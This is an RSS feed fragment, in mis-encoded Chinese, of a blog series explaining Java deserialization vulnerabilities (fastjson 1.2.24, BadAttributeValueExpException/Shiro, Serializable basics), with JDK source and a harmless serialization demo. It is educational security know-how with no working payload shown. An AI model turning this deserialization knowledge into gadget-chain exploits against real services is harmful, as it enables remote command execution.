&lt;p>åˆ›å»º Registry&lt;/p></description></item><item><title>Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆä¸‰ï¼‰fastjson 1.2.24 Templateslmpl åˆ©ç”¨åŸç†</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-3/</link><pubDate>Thu, 21 Oct 2021 22:56:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-3/</guid><description>&lt;h2 id="å£°æ˜">å£°æ˜&lt;/h2>
&lt;p>æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚&lt;/p>
&lt;h2 id="fastjson-æ˜¯ä»€ä¹ˆ">Fastjson æ˜¯ä»€ä¹ˆ&lt;/h2>
&lt;blockquote>
&lt;p>fastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°†Java Beanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚&lt;/p>&lt;/blockquote>
&lt;blockquote>
&lt;p>fastjsonç›¸å¯¹å…¶ä»–JSONåº“çš„ç‰¹ç‚¹æ˜¯å¿«ã€‚fastjsonåœ¨é˜¿é‡Œå·´å·´å¤§è§„æ¨¡ä½¿ç”¨ï¼Œåœ¨æ•°ä¸‡å°æœåŠ¡å™¨ä¸Šéƒ¨ç½²ï¼Œfastjsonåœ¨ä¸šç•Œè¢«å¹¿æ³›æ¥å—ã€‚åœ¨2012å¹´è¢«å¼€æºä¸­å›½è¯„é€‰ä¸ºæœ€å—æ¬¢è¿çš„å›½äº§å¼€æºè½¯ä»¶ä¹‹ä¸€ã€‚&lt;/p>&lt;/blockquote>
&lt;p>ä»¥ä¸Šæ‘˜è‡ªFastjson GitHub ä»‹ç»ã€‚&lt;/p>
&lt;p>ä½†è¿‘å¹´æ¥éšç€ Fastjson ä¸æ–­çˆ†å‡ºæ¼æ´ï¼Œå„å¤§ä¸­å°å‹å…¬å¸éƒ½é€æ¸å¼ƒç”¨ Fastjson ï¼Œç”šè‡³é˜¿é‡Œè‡ªå·±å¼€æºçš„æœåŠ¡æ³¨å†Œã€é…ç½®ç®¡ç†å¹³å° &lt;strong>NACOS&lt;/strong> åœ¨ 1.3.0 ç‰ˆæœ¬ä¹‹åéƒ½ä» Fastjson æ›¿æ¢ä¸ºäº† Jackson (è¯¦è§ &lt;a href="https://github.com/alibaba/nacos/releases/tag/1.3.0">https://github.com/alibaba/nacos/releases/tag/1.3.0&lt;/a>) ï¼Œå¯è§æ¼æ´å±å®³ä¹‹å¤§ã€‚&lt;/p>
&lt;h2 id="ä¸ºä»€ä¹ˆä¼šå¼ƒç”¨-fastjson-">ä¸ºä»€ä¹ˆä¼šå¼ƒç”¨ Fastjson ï¼Ÿ&lt;/h2>
&lt;p>æƒ³è¦ç ”ç©¶ä¸€ä¸ªäº§å“çš„æ¼æ´å…¶ä¸­æœ‰ä¸€æ¡å¾ˆå¥½çš„é€”å¾„å°±æ˜¯å»æŸ¥è¯¢ CVE ç¼–å·ï¼Œä½†æ˜¯æˆ‘åœ¨æ£€ç´¢ä¹‹åå‘ç° Fastjson åªæœ‰ &lt;strong>CVE-2017-18349&lt;/strong> è¿™ä¸€æ¡ï¼Œè€Œ Jackson ç«Ÿç„¶æœ‰é«˜è¾¾ 76 æ¡ã€‚&lt;/p>
&lt;p>è¿™èƒ½å¦è¯æ˜ Fastjson æ¯” Jackson æ›´å®‰å…¨å‘¢ï¼Ÿç­”æ¡ˆå¹¶ä¸æ˜¯ï¼Œéƒ½æ˜¯åŠæ–¤å…«ä¸¤ï¼Œæœ‰äº› Fastjson é‡Œé¢å‡ºç°çš„æ¼æ´åœ¨ Jackson é‡Œé¢ä¹ŸåŒæ ·å­˜åœ¨ã€‚&lt;/p>
&lt;p>é‚£ä¸ºä»€ä¹ˆä¼šæœ‰å…¬å¸å¼ƒç”¨ Fastjson å‘¢ï¼Ÿ&lt;/p>
&lt;p>æˆ–è®¸æ˜¯ Jackson æœ‰æ›´å®Œå–„ä¸”å…¬å¼€çš„æ¼æ´ç®¡ç†æœºåˆ¶ï¼Œæˆ–è®¸æ˜¯å›½å¤–çš„æœˆäº®æ¯”è¾ƒåœ†ï¼Œæˆ–è®¸æ˜¯éšå¤§æµï¼Œä¹Ÿæˆ–è®¸æ˜¯ Fastjson ä»£ç è´¨é‡ä¸è¿‡å…³ï¼ˆçŸ¥ä¹ä¸Šæœ‰å¾ˆå¤šå›ç­”æ‰¹åˆ¤ Fastjson ä»£ç ç³Ÿç³•çš„ï¼‰ï¼ŒçœŸå®åŸå› å°±ä¸å¾—è€ŒçŸ¥äº†ã€‚&lt;/p>
&lt;p>å°½ç®¡è¿‘å¹´æ¥æœ‰å…¬å¸ä¸æ–­å¼ƒç”¨ Fastjson ï¼Œä½†è¿˜æœ‰å¾ˆå¤šå…¬å¸åœ¨ä½¿ç”¨ï¼Œå¹¶ä¸”å·²ç»å¼€å‘ä¸Šçº¿çš„ç³»ç»Ÿæƒ³è¦æ›¿æ¢æˆ–è€…å‡çº§ Fastjson è¿˜éœ€è¦æ—¶é—´ï¼Œå› æ­¤æˆ‘ä»¬å¾ˆæœ‰å¿…è¦å­¦ä¹ ä¸€ä¸‹ Fastjson æ¼æ´çš„äº§å› ã€‚&lt;/p>
&lt;h2 id="fastjson-æ¼æ´äº§ç”ŸåŸå› ">Fastjson æ¼æ´äº§ç”ŸåŸå› &lt;/h2>
&lt;p>Fastjson ç¬¬ä¸€æ¬¡è¢«çˆ†å‡ºæœ‰æ¼æ´æ˜¯å®˜æ–¹åœ¨2017å¹´3æœˆ15æ—¥ä¸»åŠ¨æŠ«éœ²çš„ï¼Œè¯¦è§ &lt;a href="https://github.com/alibaba/fastjson/wiki/security_update_20170315">https://github.com/alibaba/fastjson/wiki/security_update_20170315&lt;/a> ã€‚æ¼æ´å½±å“ 1.2.24 ä»¥åŠä¹‹å‰çš„ç‰ˆæœ¬ã€‚æˆ‘ä»¬ä»Šå¤©æ¥ç ”ç©¶ä¸€ä¸‹å½“ fastjson version &amp;lt;= 1.2.24 æ—¶æ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ã€‚&lt;/p></description></item><item><title>Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆäºŒï¼‰æ–°ç‰ˆæœ¬JDKåˆ©ç”¨æ–¹å¼å’ŒShiroä¸¾ä¾‹</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-2/</link><pubDate>Sat, 16 Oct 2021 22:55:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-2/</guid><description>&lt;h2 id="å£°æ˜">å£°æ˜&lt;/h2>
&lt;p>æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚&lt;/p>
&lt;h2 id="æ–°çš„å¸Œæœ›">æ–°çš„å¸Œæœ›&lt;/h2>
&lt;h3 id="0x00">0x00&lt;/h3>
&lt;p>åœ¨ä¸Šä¸€èŠ‚ä¸­æˆ‘ä»¬ä»‹ç»äº† Java ååºåˆ—åŒ–æ¼æ´çš„æˆå› å’Œåˆ©ç”¨ &lt;code>commons-collections 3.1&lt;/code> æ­é… &lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code> å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„æ–¹å¼ã€‚ä½†&lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code> çš„é—®é¢˜å·²ç»åœ¨æœ€æ–°ç‰ˆ jdk ä¸­ä¿®å¤ï¼Œå¯åˆ©ç”¨èŒƒå›´ä»…èƒ½å¤Ÿå±€é™äºæ—§ç‰ˆæœ¬çš„jdkã€‚ç»è¿‡å®‰å…¨äººå‘˜çš„å®¡è®¡ï¼Œå¦ä¸€ä¸ªç±» &lt;code>javax.management.BadAttributeValueExpException&lt;/code> å‡ºç°åœ¨äº†å®‰å…¨äººå‘˜çš„è§†é‡ã€‚&lt;/p>
&lt;p>&lt;code>javax.management.BadAttributeValueExpException&lt;/code> ç»§æ‰¿è‡ª &lt;code>java.lang.Exception&lt;/code>ï¼Œ&lt;code>java.lang.Exception&lt;/code> ç»§æ‰¿è‡ª &lt;code>java.lang.Throwable&lt;/code>ï¼Œè€Œ &lt;code>java.lang.Throwable&lt;/code> å®ç°äº† &lt;code>java.io.Serializable&lt;/code>ã€‚å› æ­¤ &lt;code>javax.management.BadAttributeValueExpException&lt;/code> ç¬¦åˆäº† &lt;strong>å¯åºåˆ—åŒ–&lt;/strong> è¿™ä¸ªè¦æ±‚ï¼ŒåŒæ ·çš„å®ƒä¹Ÿå¢åŠ äº† &lt;code>readObject&lt;/code> æ–¹æ³•ï¼Œè¿™ä¸ªç±»çš„å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">package&lt;/span> javax.management;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.io.IOException;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.io.ObjectInputStream;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * Thrown when an invalid MBean attribute is passed to a query
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * constructing method. This exception is used internally by JMX
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * during the evaluation of a query. User code does not usually
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * see it.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * @since 1.5
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">BadAttributeValueExpException&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">extends&lt;/span> Exception {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/* Serial version */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> &lt;span style="color:#8be9fd">long&lt;/span> serialVersionUID &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">-&lt;/span>3105272988410493376L;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * @serial A string representation of the attribute that originated this exception.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * for example, the string value can be the return of {@code attribute.toString()}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> Object val;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * Constructs a BadAttributeValueExpException using the specified Object to
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * create the toString() value.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * @param val the inappropriate value.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#50fa7b">BadAttributeValueExpException&lt;/span> (Object val) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">this&lt;/span>.&lt;span style="color:#50fa7b">val&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> val &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span> &lt;span style="color:#ff79c6">?&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span> : val.&lt;span style="color:#50fa7b">toString&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * Returns the string representing the object.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> String &lt;span style="color:#50fa7b">toString&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;BadAttributeValueException: &amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> val;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">readObject&lt;/span>(ObjectInputStream ois) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> IOException, ClassNotFoundException {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ObjectInputStream.&lt;span style="color:#50fa7b">GetField&lt;/span> gf &lt;span style="color:#ff79c6">=&lt;/span> ois.&lt;span style="color:#50fa7b">readFields&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Object valObj &lt;span style="color:#ff79c6">=&lt;/span> gf.&lt;span style="color:#50fa7b">get&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;val&amp;#34;&lt;/span>, &lt;span style="color:#ff79c6">null&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (valObj &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">else&lt;/span> &lt;span style="color:#ff79c6">if&lt;/span> (valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> String) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val&lt;span style="color:#ff79c6">=&lt;/span> valObj;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">else&lt;/span> &lt;span style="color:#ff79c6">if&lt;/span> (System.&lt;span style="color:#50fa7b">getSecurityManager&lt;/span>() &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Long
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Integer
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Float
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Double
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Byte
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Short
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Boolean) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#ff79c6">=&lt;/span> valObj.&lt;span style="color:#50fa7b">toString&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">else&lt;/span> { &lt;span style="color:#6272a4">// the serialized object is from a version without JDK-8019292 fix&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#ff79c6">=&lt;/span> System.&lt;span style="color:#50fa7b">identityHashCode&lt;/span>(valObj) &lt;span style="color:#ff79c6">+&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;@&amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> valObj.&lt;span style="color:#50fa7b">getClass&lt;/span>().&lt;span style="color:#50fa7b">getName&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å°ä¼™ä¼´ä»¬å¯èƒ½ä¼šå¾ˆè¿·èŒ«ï¼Œè¿™è¦ä½•ä»ä¸‹æ‰‹ï¼Ÿ&lt;/p></description></item><item><title>Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆä¸€ï¼‰Serializable</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-1/</link><pubDate>Thu, 14 Oct 2021 23:00:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-1/</guid><description>&lt;h2 id="å£°æ˜">å£°æ˜&lt;/h2>
&lt;p>æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚&lt;/p>
&lt;h2 id="åºåˆ—åŒ–çš„å®šä¹‰">åºåˆ—åŒ–çš„å®šä¹‰&lt;/h2>
&lt;p>åºåˆ—åŒ–æ˜¯æŒ‡å°†æ•°æ®ç»“æ„æˆ–å¯¹è±¡çŠ¶æ€è½¬æ¢æˆå¯å–ç”¨æ ¼å¼ï¼Œä»¥ç•™å¾…åç»­åœ¨ç›¸åŒæˆ–å¦ä¸€å°è®¡ç®—æœºç¯å¢ƒä¸­ï¼Œèƒ½æ¢å¤åŸå…ˆçŠ¶æ€çš„è¿‡ç¨‹ã€‚ä¾ç…§åºåˆ—åŒ–æ ¼å¼é‡æ–°è·å–å­—èŠ‚çš„ç»“æœæ—¶ï¼Œå¯ä»¥åˆ©ç”¨å®ƒæ¥äº§ç”Ÿä¸åŸå§‹å¯¹è±¡ç›¸åŒè¯­ä¹‰çš„å‰¯æœ¬ã€‚&lt;/p>
&lt;h2 id="java-ä¸­çš„åºåˆ—åŒ–">Java ä¸­çš„åºåˆ—åŒ–&lt;/h2>
&lt;p>Java è‡ªèº«æä¾›äº†åºåˆ—åŒ–çš„åŠŸèƒ½ï¼Œéœ€è¦å®ç° &lt;code>java.io.Serializable&lt;/code> æ¥å£ï¼Œæ ‡æ˜è¯¥å¯¹è±¡æ˜¯å¯åºåˆ—åŒ–çš„ã€‚ &lt;code>java.io.Serializable&lt;/code> æ˜¯ä¸€ä¸ªç©ºæ¥å£ï¼Œä¸éœ€è¦å¯¹è±¡å®ç°æ–¹æ³•ã€‚&lt;/p>
&lt;p>ä»¥ä¸‹é¢è¿™æ®µä»£ç ä¸ºä¾‹ï¼Œå±•ç¤ºäº†ä¸€ä¸ªå¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.io.*;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.nio.charset.StandardCharsets;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.util.Base64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Eval0&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Command&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">implements&lt;/span> Serializable {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> String cmd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> String &lt;span style="color:#50fa7b">getCmd&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> cmd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">setCmd&lt;/span>(String cmd) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">this&lt;/span>.&lt;span style="color:#50fa7b">cmd&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> cmd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>(String&lt;span style="color:#ff79c6">[]&lt;/span> args) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> Exception {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// å®šä¹‰ä¸€ä¸ªå¯¹è±¡&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Command command &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> Command();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> command.&lt;span style="color:#50fa7b">setCmd&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;calc&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;åºåˆ—åŒ–å‰: &amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> command.&lt;span style="color:#50fa7b">getCmd&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// å°†ç”¨æˆ·åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ByteArrayOutputStream buffer &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ByteArrayOutputStream();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">try&lt;/span> (ObjectOutputStream outputStream &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ObjectOutputStream(buffer)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> outputStream.&lt;span style="color:#50fa7b">writeObject&lt;/span>(command);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// å°†å­—èŠ‚æ•°ç»„è¿›è¡Œbase64ç¼–ç ï¼Œæ— è®ºæ˜¯é€šè¿‡ç½‘ç»œæˆ–è€…æ˜¯æ–‡ä»¶éƒ½å¯ä»¥å‘é€åˆ°å¦ä¸€ä¸ªç³»ç»Ÿè¿›è¡Œååºåˆ—åŒ–&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> String data &lt;span style="color:#ff79c6">=&lt;/span> Base64.&lt;span style="color:#50fa7b">getEncoder&lt;/span>().&lt;span style="color:#50fa7b">encodeToString&lt;/span>(buffer.&lt;span style="color:#50fa7b">toByteArray&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;åºåˆ—åŒ–å: &amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> data);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// å°†base64ç¼–ç çš„æ•°æ®å†è§£ç ä¸ºå­—èŠ‚æ•°ç»„&lt;/span>
